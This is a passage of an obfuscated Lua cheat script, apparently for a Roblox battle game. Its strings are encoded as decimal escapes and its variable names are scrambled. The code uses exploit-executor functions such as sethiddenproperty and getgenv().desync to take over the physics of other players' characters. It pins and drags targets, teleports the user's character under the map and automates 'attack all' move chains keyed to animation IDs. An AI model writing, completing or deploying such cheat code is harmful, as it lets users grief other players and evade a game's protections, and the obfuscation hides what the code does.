 if descendant:IsA("\066\111\100\121\086\101\108\111\099\105\116\121") then if descendant.Name ~= "\109\111\118\101\109\101" or (descendant:GetAttribute("\083\112\101\101\100") or 0x0) ~= 0xA5 then if descendant.Name == "\100\111\100\103\101\118\101\108\111\099\105\116\121" and not descendant:GetAttribute("\067\108\111\110\101") then RunService.Stepped:Wait() for _lIIlIllIlI, dashTrack in pairs(_lIlllIllII:GetPlayingAnimationTracks()) do if dashTrack.Animation.AnimationId:match("\049\048\052\057\049\057\057\051\054\056\050") and dashTrack.TimePosition <= 0.1 then if _llIIllIlll.CustomBackDash.Value then local _lIIllIlIll = descendant:Clone() _lIIllIlIll:SetAttribute("\067\108\111\110\101", true) table.insert(_IIlllIIIlI, _lIIllIlIll) descendant.Parent = workspace while descendant and descendant.Parent do _lIIllIlIll.Parent = _lIllIIIIll _lIIllIlIll.Velocity = descendant.Velocity * _lIIlIllIlI.BDDistance.Value RunService.RenderStepped:Wait() end
 if _lIIllIlIll and _lIIllIlIll.Parent then _lIIllIlIll:Destroy() local _IIIllIIIIl = table.find(_IIlllIIIlI, _lIIllIlIll) if _IIIllIIIIl then table.remove(_IIlllIIIlI, _IIIllIIIIl) end
 end
 end
 return end
 end
 if _llIIllIlll.CustomSideDash.Value then local _lIllllIlII = descendant:Clone() _lIllllIlII:SetAttribute("\067\108\111\110\101", true) table.insert(_IIlllIIIlI, _lIllllIlII) descendant.Parent = workspace while descendant and descendant.Parent do _lIllllIlII.Parent = _lIllIIIIll _lIllllIlII.Velocity = descendant.Velocity * _lIIlIllIlI.SDDistance.Value RunService.RenderStepped:Wait() end
 if _lIllllIlII and _lIllllIlII.Parent then _lIllllIlII:Destroy() local _IIIllIIIIl = table.find(_IIlllIIIlI, _lIllllIlII) if _IIIllIIIIl then table.remove(_IIlllIIIlI, _IIIllIIIIl) end
 end
 end
 end
 else if _llIIllIlll.CustomFrontDash.Value then descendant:SetAttribute("\083\112\101\101\100", _lIIlIllIlI.FDDistance.Value) end
 for _lIIlIllIlI, cloneItem in pairs(_IIlllIIIlI) do cloneItem:Destroy() end
 table.clear(_IIlllIIIlI) end
 end
 if descendant:IsA("\066\111\100\121\080\111\115\105\116\105\111\110") then if descendant.Name ~= "\065\073\082\066\080" or (descendant.D ~= 0x320 or (descendant.P ~= 0x2710 or (descendant.MaxForce ~= Vector3.new(0x1,0x1,0x1) * 0x9C40 or not _llIIllIlll.NoBP_WindstormFury.Value))) then if descendant.Name ~= "\065\073\082\066\080" or (descendant.D ~= 0x320 or (descendant.P ~= 0x2710 or (descendant.MaxForce ~= Vector3.new(0x1,0x1,0x1) * 0x9C40 or (descendant:GetAttribute("\083\112\105\110\067\101\110\116\101\114") == nil or not _llIIllIlll.NoBP_TatsumakiUlt.Value)))) then if descendant.Name == "\065\073\082\066\080" and (descendant.D == 0x352 and (descendant.P == 0x2710 and (descendant.MaxForce == Vector3.new(0x1,0x1,0x1) * 0x9C40 and _llIIllIlll.NoBP_PreysPeril.Value))) then task.spawn(pcall, _IIllIlllll, descendant, false) end
 else task.spawn(pcall, _IIllIlllll, descendant, false) end
 else task.spawn(pcall, _IIllIlllll, descendant, false) end
 end
 if descendant.Name == "\084\104\114\111\119\084\114\097\115\104\099\097\110" then _lIIIllIlIl["\084\114\097\115\104\099\097\110\032\076\097\117\110\099\104"] = true task.delay(0.25, function () _lIIIllIlIl["\084\114\097\115\104\099\097\110\032\076\097\117\110\099\104"] = false end
 ) end
 if descendant:IsA("\065\099\099\101\115\115\111\114\121") then if descendant.Name == "\082\097\103\100\111\108\108" then if _llIIllIlll.AutoRagdollCancel.Value then _IllIIIIIlI({ Dash = Enum.KeyCode.S, Key = Enum.KeyCode.Q, Goal = "\075\101\121\080\114\101\115\115", }) end
 end
 end
 end
 ) _llIIIIlIIl[#_llIIIIlIIl+0x1] = _lIlllIllII.AnimationPlayed:Connect( function (animTrack) local _lllIlIllII = animTrack.Animation.AnimationId if _lllIlIllII:match("\049\048\052\056\048\055\057\054\048\050\049") or _lllIlIllII:match("\049\048\052\056\048\055\057\051\057\054\050") then if _llIIllIlll.CustomSideDash.Value then animTrack:AdjustSpeed(_lIIlIllIlI.SDSpeed.Value) end
 end
 end
 ) _llIIIIlIIl[#_llIIIIlIIl+0x1] = _lIlllIllII.AnimationPlayed:Connect( function (animTrack) local _lllIlIllII = animTrack.Animation.AnimationId if not _llIIllIlll.AttackAll.Value then return end
 local function _IlIllIlIII(_IIIIlllIll) if not _IIIIlllIll or not _IIIIlllIll:IsA("\080\108\097\121\101\114") then return false end
 local _IIllIIlllI = _lIlIIIIlII(_IIIIlllIll) local _IlllIlllIl = _IIllIIlllI and _IIllIIlllI:GetAttribute("\067\104\097\114\097\099\116\101\114") if type(_IlllIlllIl) ~= "\115\116\114\105\110\103" then return false end
 _IlllIlllIl = _IlllIlllIl:lower() return _IlllIlllIl == "\104\117\110\116\101\114" or _IlllIlllIl == "\098\108\097\100\101" or _IlllIlllIl:find("\122\111\109\098\105\101", 0x1, true) ~= nil end
 local function _llIIllIlIl(shouldAnchor) local _IllIIlIllI _IllIIlIllI = RunService.Heartbeat:Connect( function () if not shouldAnchor() then _IllIIlIllI:Disconnect() return end
 local _IIIlIIIIIl = _lIlIlIIlII(_lIlIIIIlII(_llIlIIlIll)) if _IIIlIIIIIl then _IIIlIIIIIl.AssemblyLinearVelocity = Vector3.new() _IIIlIIIIIl.AssemblyAngularVelocity = Vector3.new() end
 end
 ) return _IllIIlIllI end
 local _IIlIIllIIl = nil local _IIllIIlIll = nil local _IlllIIlIlI = nil local _IIIIIIIlll = nil local function _lIIlIlllll() if _IIlIIllIIl then _IIlIIllIIl:Disconnect() _IIlIIllIIl = nil end
 if _IIllIIlIll then _IIllIIlIll:Disconnect() _IIllIIlIll = nil end
 if sethiddenproperty then if _IlllIIlIlI and _IlllIIlIlI.Parent then pcall( function () sethiddenproperty(_IlllIIlIlI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 if _IIIIIIIlll and _IIIIIIIlll.Parent then pcall( function () sethiddenproperty(_IIIIIIIlll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 end
 if _IlllIIlIlI and _IlllIIlIlI.Parent then _IlllIIlIlI.CFrame = CFrame.new(_IlllIIlIlI.Position) _IlllIIlIlI.AssemblyLinearVelocity = Vector3.zero _IlllIIlIlI.AssemblyAngularVelocity = Vector3.zero pcall( function () _IlllIIlIlI.Velocity = Vector3.zero end
 ) pcall( function () _IlllIIlIlI.RotVelocity = Vector3.zero end
 ) local _IIllIIIlIl = _IlllIIlIlI.Parent:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IIllIIIlIl then pcall( function () _IIllIIIlIl.AutoRotate = true end
 ) end
 end
 _IlllIIlIlI = nil _IIIIIIIlll = nil end
 local function _llIIllIIll() _lIIlIlllll() end
 local function _IlllIIIlll(_llIllIIIII, _IIIlIIllll) if _IIlIIllIIl then _IIlIIllIIl:Disconnect() _IIlIIllIIl = nil end
 if _IlllIIlIlI and _IlllIIlIlI.Parent then _IlllIIlIlI.AssemblyLinearVelocity = Vector3.zero _IlllIIlIlI.AssemblyAngularVelocity = Vector3.zero pcall( function () _IlllIIlIlI.Velocity = Vector3.zero end
 ) pcall( function () _IlllIIlIlI.RotVelocity = Vector3.zero end
 ) end
 if not _llIllIIIII or not _IIIlIIllll then return end
 _IlllIIlIlI = _llIllIIIII _IIIIIIIlll = _IIIlIIllll if _IIllIIlIll then _IIllIIlIll:Disconnect() _IIllIIlIll = nil end
 local _IlIlllIIII = _llIllIIIII.Parent and _llIllIIIII.Parent:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIlllIIII then _IIllIIlIll = RunService.RenderStepped:Connect( function () if _IlIlllIIII and _IlIlllIIII.Parent then pcall( function () _IlIlllIIII.AutoRotate = false end
 ) end
 end
 ) end
 _llIllIIIII.CFrame = _IIIlIIllll.CFrame * CFrame.new(0x0, 0x0, 0x5) _llIllIIIII.AssemblyLinearVelocity = Vector3.zero _llIllIIIII.AssemblyAngularVelocity = Vector3.zero if sethiddenproperty then pcall( function () sethiddenproperty(_llIllIIIII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _llIllIIIII) end
 ) pcall( function () sethiddenproperty(_llIllIIIII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IIIlIIllll) end
 ) end
 local _llllIllIll _llllIllIll = RunService.Heartbeat:Connect( function () if not _llIllIIIII or not _llIllIIIII.Parent or not _IIIlIIllll or not _IIIlIIllll.Parent then _llllIllIll:Disconnect() if _IIlIIllIIl == _llllIllIll then _IIlIIllIIl = nil end
 if sethiddenproperty then if _llIllIIIII and _llIllIIIII.Parent then pcall( function () sethiddenproperty(_llIllIIIII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 if _IIIlIIllll and _IIIlIIllll.Parent then pcall( function () sethiddenproperty(_IIIlIIllll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 end
 if _llIllIIIII and _llIllIIIII.Parent then _llIllIIIII.AssemblyLinearVelocity = Vector3.zero _llIllIIIII.AssemblyAngularVelocity = Vector3.zero pcall( function () _llIllIIIII.Velocity = Vector3.zero end
 ) pcall( function () _llIllIIIII.RotVelocity = Vector3.zero end
 ) end
 return end
 _llIllIIIII.CFrame = _IIIlIIllll.CFrame * CFrame.new(0x0, 0x0, 0x5) _llIllIIIII.AssemblyLinearVelocity = Vector3.zero _llIllIIIII.AssemblyAngularVelocity = Vector3.zero if sethiddenproperty then pcall( function () sethiddenproperty(_llIllIIIII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IIIlIIllll) end
 ) end
 end
 ) _IIlIIllIIl = _llllIllIll end
 if _lllIlIllII:match("\049\052\055\049\057\050\057\048\051\050\056") and rawget(_lIIlIllIlI.AttackAllMoves.Value, "\083\097\118\097\103\101\032\084\111\114\110\097\100\111") then task.spawn( function () local _IlIIIllIIl = _lIlIIIIlII(_llIlIIlIll) local _llIllIIIII = _IlIIIllIIl and _lIlIlIIlII(_IlIIIllIIl) if not _llIllIIIII then return end
 local _lIIIIIlllI = _llIllIIIII.CFrame RunService.Heartbeat:Once( function () _llIllIIIII.CFrame = CFrame.new(0x0, -0x2710, 0x0) end
 ) task.wait(0.9) local _lIIIllllII = tick() repeat _IllIlIlIlI(true) task.wait(0.03) until tick() >= _lIIIllllII + 1.75 game:GetService("\084\119\101\101\110\083\101\114\118\105\099\101"):Create(_llIllIIIII, TweenInfo.new(0.35, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), { CFrame = CFrame.new(0x160, 0x1B6, 0x188), }):Play() task.wait(1.5) RunService.Heartbeat:Once( function () _llIllIIIII.CFrame = _lIIIIIlllI end
 ) end
 ) end
 if _lllIlIllII:match("\049\052\055\048\049\050\052\050\054\054\049") and rawget(_lIIlIllIlI.AttackAllMoves.Value, "\066\114\117\116\097\108\032\066\101\097\116\100\111\119\110") then task.spawn( function () local _IlIIIllIIl = _lIlIIIIlII(_llIlIIlIll) local _llIllIIIII = _IlIIIllIIl and _lIlIlIIlII(_IlIIIllIIl) if not _llIllIIIII then return end
 RunService.Heartbeat:Once( function () _llIllIIIII.CFrame = CFrame.new(0x0, -0x2710, 0x0) end
 ) task.wait(0x2) local _lIIIllllII = tick() repeat _IllIlIlIlI(true) task.wait(0.05) until tick() >= _lIIIllllII + 4.5 local _lIlllIllIl = tick() repeat _IllIlIlIlI(true) task.wait(0.05) until tick() >= _lIlllIllIl + 1.3 end
 ) end
 if _lllIlIllII:match("\049\056\056\057\054\050\050\057\051\050\049") and rawget(_lIIlIllIlI.AttackAllMoves.Value, "\084\119\105\110\032\070\097\110\103\115") then task.spawn( function () local _lllllIllII = _lIlIIIIlII(_llIlIIlIll) if not _lllllIllII then return end
 if _lllllIllII:GetAttribute("\067\104\097\114\097\099\116\101\114") ~= "\080\117\114\112\108\101" then return end
 if not _lllllIllII:GetAttribute("\085\108\116\101\100") then return end
 local _lIllIIIlIl = tick() + 0x3 local _lllllIlIII = true local _IllIIIIlIl = tick() task.spawn( function () repeat task.wait() until tick() >= _IllIIIIlIl + 2.5 or not _lllllIlIII if not _lllllIlIII then return end
 local _IllIlIIlIl = _lIlIIIIlII(_llIlIIlIll) if not _IllIlIIlIl or not _IllIlIIlIl:GetAttribute("\085\108\116\101\100") then return end
 getgenv().desync = { CFrame = CFrame.new(0x0, -0x7148, 0x0) } task.wait(0.2) getgenv().desync = nil end
 ) local _IIllIllIIl = _llIIllIlIl( function () return _lllllIlIII end
 ) local _lIlIllllII = {} local _IllIlIlIll = nil local _IIlIIllIlI = tick() local _IllIIllIII = nil do local _lIIIlIlllI = _lIlIIIIlII(_llIlIIlIll) local _IIlIIIIlIl = _lIIIlIlllI and _lIlIlIIlII(_lIIIlIlllI) if _IIlIIIIlIl then _IllIIllIII = _IIlIIIIlIl.CFrame end
 end
 local function _IllllllIll(_lIIIllllII) if not _lIIIllllII then return nil end
 if _lIIIllllII:IsA("\080\108\097\121\101\114") then return _lIlIIIIlII(_lIIIllllII) end
 return _lIIIllllII end
 local function _IlIlIIIlIl(_lIIIllllII) return _IIIlIIIIll(_IllllllIll(_lIIIllllII)) end
 local function _IllIlIlllI(_lIIIllllII) return _lIlIlIIlII(_IllllllIll(_lIIIllllII)) end
 local function _IIlllIIIII(_IlIlIllIll) if not _IlIlIllIll then return false end
 if _IlIlIllIll:FindFirstChild("\070\111\114\099\101\070\105\101\108\100") then return true end
 if _IlIlIllIll:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") then return true end
 if _IlIlIllIll:FindFirstChild("\066\101\105\110\103\071\114\097\098\098\101\100") then return true end
 if _IlIlIllIll:FindFirstChild("\072\117\110\116\101\114\067\111\117\110\116\101\114") then return true end
 if _IlIlIllIll:FindFirstChild("\065\116\111\109\105\099\067\111\117\110\116\101\114") then return true end
 return false end
 local function _lllIlIlIIl(_IIIIlllIll) local _IlIlIllIll = _IllllllIll(_IIIIlllIll) local _IllIllIIll = _IlIlIllIll and _IIIlIIIIll(_IlIlIllIll) if not _IlIlIllIll or not _IllIllIIll then return true end
 if _IllIllIIll.Health <= 0x0 then return true end
 if _IIIIlllIll:IsA("\080\108\097\121\101\114") then if _IIlllIIIII(_IlIlIllIll) then return true end
 if _IlIlIllIll:FindFirstChild("\067\111\117\110\116\101\114") then return true end
 if _IIIIIIIIII(_IllIllIIll, "\049\053\049\050\056\056\052\057\048\052\055") then return true end
 if _IlIlIllIll:GetAttribute("\085\108\116\101\100") and _IlIlIllIll:GetAttribute("\067\104\097\114\097\099\116\101\114") == "\066\097\116\116\101\114" then return true end
 end
 return false end
 local function _lIIIIlllIl(_IIIIlllIll) local _IllIllIIll = _IlIlIIIlIl(_IIIIlllIll) return _IllIllIIll and (_IIIIIIIIII(_IllIllIIll, "\049\056\056\057\054\050\050\050\056\053\051") or _IIIIIIIIII(_IllIllIIll, "\049\051\055\052\051\052\050\053\055\053\049\054\048\049\052")) end
 local function _IlIIlIIlIl(_IIIIlllIll) if not _IIIIlllIll or not _IIIIlllIll:IsA("\080\108\097\121\101\114") then return false end
 local _IlIlIllIll = _lIlIIIIlII(_IIIIlllIll) local _IllIllIIll = _IlIlIllIll and _IIIlIIIIll(_IlIlIllIll) if not _IlIlIllIll or not _IllIllIIll then return false end
 if _IllIllIIll.Health <= 0x0 then return false end
 if _IIIIIIIIII(_IllIllIIll, "\049\053\049\050\056\056\052\057\048\052\055") then return false end
 return _IIlllIIIII(_IlIlIllIll) end
 local function _lIIlIIIIII() local _llIIIlIIIl = workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") if not _llIIIlIIIl then return nil end
 local _IllIllIIll = _IIIlIIIIll(_llIIIlIIIl) if not _IllIllIIll or _IllIllIIll.Health <= 0x0 then return nil end
 return _llIIIlIIIl end
 local function _IlllIIIIIl(excluded) local _lllllIIlII = {} local _IlIIIIIllI = {} for _lIIlIllIlI, _lIIlIIlllI in pairs(_IIIllllIII()) do if _lIIlIIlllI == excluded or _lIlIllllII[_lIIlIIlllI] then continue end
 if table.find(RevenantWhitelist, _lIIlIIlllI) then continue end
 local _IlIIIlIIlI = _IllIlIlllI(_lIIlIIlllI) if not _lllIlIlIIl(_lIIlIIlllI) and not _lIIIIlllIl(_lIIlIIlllI) and _IlIIIlIIlI then if _IlIllIlIII(_lIIlIIlllI) then table.insert(_lllllIIlII, _lIIlIIlllI) else table.insert(_IlIIIIIllI, _lIIlIIlllI) end
 end
 end
 if #_lllllIIlII > 0x0 then return _lllllIIlII[math.random(0x1, #_lllllIIlII)] end
 if #_IlIIIIIllI > 0x0 then return _IlIIIIIllI[math.random(0x1, #_IlIIIIIllI)] end
 local _llIIIlIIIl = _lIIlIIIIII() if _llIIIlIIIl and _llIIIlIIIl ~= excluded and not _lIlIllllII[_llIIIlIIIl] then return _llIIIlIIIl end
 return nil end
 local _llIIIIllll = nil local function _llIIIllIII(next) if _llIIIIllll then pcall( function () _llIIIIllll:Disconnect() end
 ) _llIIIIllll = nil end
 _lIIlIlllll() _IllIlIlIll = next _IIlIIllIlI = tick() if next then local _IlIIIllIIl = _lIlIIIIlII(_llIlIIlIll) local _llIllIIIII = _IlIIIllIIl and _lIlIlIIlII(_IlIIIllIIl) local _lllllIlIIl = _IllIlIlllI(next) if _llIllIIIII and _lllllIlIIl then _IlllIIIlll(_llIllIIIII, _lllllIlIIl) local _IllIllIIll = _IlIlIIIlIl(next) if _IllIllIIll then local _IIlIIIIIIl = _IllIllIIll:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") local _IIlllIllIl = _IIlIIIIIIl and _IIlIIIIIIl.AnimationPlayed or _IllIllIIll.AnimationPlayed _llIIIIllll = _IIlllIllIl:Connect( function (_IlIlIlIlIl) local _IlIIIllllI = _IlIlIlIlIl.Animation.AnimationId if _IlIIIllllI:match("\049\056\056\057\054\050\050\050\056\053\051") or _IlIIIllllI:match("\049\051\055\052\051\052\050\053\055\053\049\054\048\049\052") then if not _lllllIlIII then return end
 local _lIIIlIIlll = _IllIlIlIll if not _lIIIlIIlll then return end
 _lIlIllllII[_lIIIlIIlll] = true _lIIlIlllll() local _IIlIIIIIII = _IlllIIIIIl(_lIIIlIIlll) if _IIlIIIIIII then _llIIIllIII(_IIlIIIIIII) if _IlllIIIIIl(_IIlIIIIIII) == nil and not _IllIlIllll() then task.wait(0.1) _lIlIllllII[_IIlIIIIIII] = true _IIIIllIIlI = true _lIIlIIIlll() end
 else if _IllIlIllll() then _lIIlIlllll() _IllIlIlIll = nil else _IIIIllIIlI = true _lIIlIIIlll() end
 end
 end
 end
 ) end
 end
 end
 end
 local function _IIIlIIIlII() if not _IllIIllIII then return end
 local _IIIIIIllll = _lIlIIIIlII(_llIlIIlIll) local _IlllIllIIl = _IIIIIIllll and _lIlIlIIlII(_IIIIIIllll) if _IlllIllIIl then pcall( function () _IlllIllIIl.CFrame = _IllIIllIII end
 ) end
 end
 local function _llIlIlIllI() local _IIIIIIllll = _lIlIIIIlII(_llIlIIlIll) local _IIIIIIIIll = _IIIIIIllll and _IIIlIIIIll(_IIIIIIllll) if _IIIIIIIIll then pcall( function () _IIIIIIIIll.AutoRotate = true end
 ) end
 end
 local _lIllllIIII = workspace.Live.ChildAdded:Connect( function (_IIIlIIIlII) if _IIIlIIIlII.Name == "\087\101\097\107\101\115\116\032\068\117\109\109\121" then _lIlIllllII[_IIIlIIIlII] = nil end
 end
 ) local _IIIIlIlllI = RunService.RenderStepped:Connect( function () for _lIIlIllIlI, _lIIlIIlllI in pairs(_IIIllllIII()) do if table.find(RevenantWhitelist, _lIIlIIlllI) then continue end
 if not _lIlIllllII[_lIIlIIlllI] then continue end
 local _lIIIIIlIll = _lIlIIIIlII(_lIIlIIlllI) local _lIIlIIIIlI = _lIIIIIlIll and _IIIlIIIIll(_lIIIIIlIll) if _lIIIIIlIll and _lIIlIIIIlI and _lIIlIIIIlI.Health > 0x0 and not _IIlllIIIII(_lIIIIIlIll) then _lIlIllllII[_lIIlIIlllI] = nil if not _IllIlIlIll then _llIIIllIII(_lIIlIIlllI) end
 end
 end
 end
 ) local function _IllIlIllll() for _lIIlIllIlI, _lIIlIIlllI in pairs(_IIIllllIII()) do if _lIlIllllII[_lIIlIIlllI] then continue end
 if table.find(RevenantWhitelist, _lIIlIIlllI) then continue end
 if _IlIIlIIlIl(_lIIlIIlllI) then return true end
 end
 return false end
 local _IlllIIIlll = false local function _lIIlIIIlll() if _IlllIIIlll then return end
 _IlllIIIlll = true _lIIlIlllll() _llIlIlIllI() if _IIIIlIlllI then pcall( function () _IIIIlIlllI:Disconnect() end
 ) end
 if _lIllllIIII then pcall( function () _lIllllIIII:Disconnect() end
 ) end
 if _llIIIIllll then pcall( function () _llIIIIllll:Disconnect() end
 ) _llIIIIllll = nil end
 _lllllIlIII = false _llIIllIIll() end
 local _IIIIllIIlI = false local _IlIlIIIlIl = _IlllIIIIIl(nil) if _IlIlIIIlIl then _llIIIllIII(_IlIlIIIlIl) if _IlllIIIIIl(_IlIlIIIlIl) == nil then task.wait(0.1) _lIlIllllII[_IlIlIIIlIl] = true _IIIIllIIlI = true _lIIlIIIlll() return end
 end
 while animTrack.IsPlaying and tick() < _lIllIIIlIl do RunService.Heartbeat:Wait() local _lIlllIlIll = tick() local _lllllllIII = false if not _IllIlIlIll then _lllllllIII = true else if _lllIlIlIIl(_IllIlIlIll) then if not _IlIIlIIlIl(_IllIlIlIll) then _lIlIllllII[_IllIlIlIll] = true end
 _lllllllIII = true elseif _lIlllIlIll - _IIlIIllIlI >= 0.8 then _lIlIllllII[_IllIlIlIll] = true _lllllllIII = true end
 end
 if _lllllllIII then local next = _IlllIIIIIl(_IllIlIlIll) if not next then if _IllIlIllll() then _lIIlIlllll() _IllIlIlIll = nil else _IIIIllIIlI = true _lIIlIIIlll() break end
 else _llIIIllIII(next) if _IlllIIIIIl(next) == nil and not _IllIlIllll() then task.wait(0.1) _lIlIllllII[next] = true _IIIIllIIlI = true _lIIlIIIlll() break end
 end
 end
 do local _IlIIllIIll = _lIIlIIIIII() if _IlIIllIIll and not _lIlIllllII[_IlIIllIIll] then local _IllIlIIlIl = _IlIIllIIll:FindFirstChild("\072\117\109\097\110\111\105\100") local _IlIIllIIIl = _IllIlIIlIl and _IllIlIIlIl:FindFirstChild("\065\110\105\109\097\116\111\114") local function _lIIIIllIIl(_IlIIIllllI) if not _IlIIllIIIl then return false end
 for _lIIlIllIlI, _lIIIllllII in pairs(_IlIIllIIIl:GetPlayingAnimationTracks()) do if _lIIIllllII.Animation.AnimationId:match(_IlIIIllllI) then return true end
 end
 return false end
 if _IllIlIIlIl and (_lIIIIllIIl("\049\056\056\057\054\050\050\050\056\053\051") or _lIIIIllIIl("\049\051\055\052\051\052\050\053\055\053\049\054\048\049\052")) then _lIlIllllII[_IlIIllIIll] = true if _IllIlIlIll == _IlIIllIIll then _lIIlIlllll() local _IIlIIIIIII = _IlllIIIIIl(_IlIIllIIll) if _IIlIIIIIII then _llIIIllIII(_IIlIIIIIII) if _IlllIIIIIl(_IIlIIIIIII) == nil and not _IllIlIllll() then task.wait(0.1) _lIlIllllII[_IIlIIIIIII] = true _IIIIllIIlI = true _lIIlIIIlll() break end
 else if _IllIlIllll() then _IllIlIlIll = nil else _IIIIllIIlI = true _lIIlIIIlll() break end
 end
 end
 end
 end
 end
 end
 _lIIlIIIlll() end
 ) end
 if _lllIlIllII:match("\057\051\053\052\054\048\048\052\052\050\056\057\048\052") and rawget(_lIIlIllIlI.AttackAllMoves.Value, "\067\114\117\115\104\101\100\032\082\111\099\107\032\086\097\114\105\097\110\116") then _IllIllIlll = 0x0 _IlIlIIlIII = false task.spawn( function () local _IIIIIIllll = _lIlIIIIlII(_llIlIIlIll) local _IIIIIIIIll = _IIIIIIllll and _IIIlIIIIll(_IIIIIIllll) local _IlllllllII = _IIIIIIIIll and _IIIIIIIIll:FindFirstChild("\065\110\105\109\097\116\111\114") if not _IlllllllII then return end
 while true do local _lIllllIIlI = false for _lIIlIllIlI, _lIIIllllII in pairs(_IlllllllII:GetPlayingAnimationTracks()) do if _lIIIllllII.Animation.AnimationId:match("\057\051\053\052\054\048\048\052\052\050\056\057\048\052") then _lIllllIIlI = true break end
 end
 if not _lIllllIIlI then _IllIllIlll = 0x0 _IlIlIIlIII = false break end
 for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI == _llIlIIlIll then continue end
 local _lIIIIIlIll = _lIlIIIIlII(_lIIlIIlllI) local _lIIlIIIIlI = _lIIIIIlIll and _IIIlIIIIll(_lIIIIIlIll) if _lIIlIIIIlI and _lIIIIIlIll and not _lIIIIIlIll:GetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116") then if _IIIIIIIIII(_lIIlIIIIlI, "\049\050\057\057\052\053\057\048\055\048\052\052\049\050\053") then _lIIIIIlIll:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) _IllIllIlll = _IllIllIlll + 0x1 local _IIlIIlIllI = _lIIlIIlllI.Name end
 end
 end
 local _IlIIllIIll = workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") local _IllIIIIlIl = _IlIIllIIll and _IlIIllIIll:FindFirstChild("\072\117\109\097\110\111\105\100") local _IlIlIlIIII = _IllIIIIlIl and _IllIIIIlIl:FindFirstChild("\065\110\105\109\097\116\111\114") if _IlIlIlIIII and _IlIIllIIll and not _IlIIllIIll:GetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116") then for _lIIlIllIlI, _lIIIllllII in pairs(_IlIlIlIIII:GetPlayingAnimationTracks()) do if _lIIIllllII.Animation.AnimationId:match("\049\050\057\057\052\053\057\048\055\048\052\052\049\050\053") then _IlIIllIIll:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) end
 end
 end
 task.wait() end
 end
 ) end
 if _lllIlIllII:match("\055\050\052\053\049\055\049\053\053\056\051\050\050\053") and rawget(_lIIlIllIlI.AttackAllMoves.Value, "\067\114\117\115\104\101\100\032\082\111\099\107\032\086\097\114\105\097\110\116") then task.spawn( function () for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI == _llIlIIlIll then continue end
 local _lIIIIIlIll = _lIlIIIIlII(_lIIlIIlllI) if _lIIIIIlIll then _lIIIIIlIll:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", nil) end
 end
 local _IlIIllIIll = workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") if _IlIIllIIll then _IlIIllIIll:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", nil) end
 end
 ) if _lllIlllIII then _lllIlllIII = false end
 end
 if _lllIlIllII:match("\049\051\049\050\050\054\052\051\048\052\054\057\057\051\049") and rawget(_lIIlIllIlI.AttackAllMoves.Value, "\067\114\117\115\104\101\100\032\082\111\099\107\032\086\097\114\105\097\110\116") then task.spawn( function () task.wait(1.2) local _IlIlllIlIl = _lIlIIIIlII(_llIlIIlIll) local _lllIllIlll = _IlIlllIlIl and _lIlIlIIlII(_IlIlllIlIl) if not _lllIllIlll then return end
 if (tonumber(_llIlIIlIll:GetAttribute("\085\108\116\105\109\097\116\101")) or 0x0) >= 0x64 then return end
 getgenv().desync = { CFrame = CFrame.new(0x0, -0x7148, 0x0) } task.wait(0.65) getgenv().desync = nil end
 ) end
 if _lllIlIllII:match("\049\051\053\049\048\052\050\049\048\052\048\048\054\049\048") and rawget(_lIIlIllIlI.AttackAllMoves.Value, "\067\114\117\115\104\101\100\032\082\111\099\107\032\086\097\114\105\097\110\116") then local _lllIIIlIII = false local _IlIIIlIIII = {} local _IlIIllIlIl = nil local _IllIlllIll = nil local _IIIlIlllII = nil local _lIIllIIIII = nil local function _lIlIIllIlI() if _IlIIllIlIl then _IlIIllIlIl:Disconnect() _IlIIllIlIl = nil end
 if _IllIlllIll then _IllIlllIll:Disconnect() _IllIlllIll = nil end
 if sethiddenproperty then if _IIIlIlllII and _IIIlIlllII.Parent then pcall( function () sethiddenproperty(_IIIlIlllII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 if _lIIllIIIII and _lIIllIIIII.Parent then pcall( function () sethiddenproperty(_lIIllIIIII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 end
 if _IIIlIlllII and _IIIlIlllII.Parent then _IIIlIlllII.CFrame = CFrame.new(_IIIlIlllII.Position) _IIIlIlllII.AssemblyLinearVelocity = Vector3.zero _IIIlIlllII.AssemblyAngularVelocity = Vector3.zero pcall( function () _IIIlIlllII.Velocity = Vector3.zero end
 ) pcall( function () _IIIlIlllII.RotVelocity = Vector3.zero end
 ) local _IllIIlIlll = _IIIlIlllII.Parent:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IllIIlIlll then pcall( function () _IllIIlIlll.AutoRotate = true end
 ) end
 end
 _IIIlIlllII = nil _lIIllIIIII = nil end
 local function _IlIlIlIIlI(_llIllIIIII, _IIIlIIllll) if _IlIIllIlIl then _IlIIllIlIl:Disconnect() _IlIIllIlIl = nil end
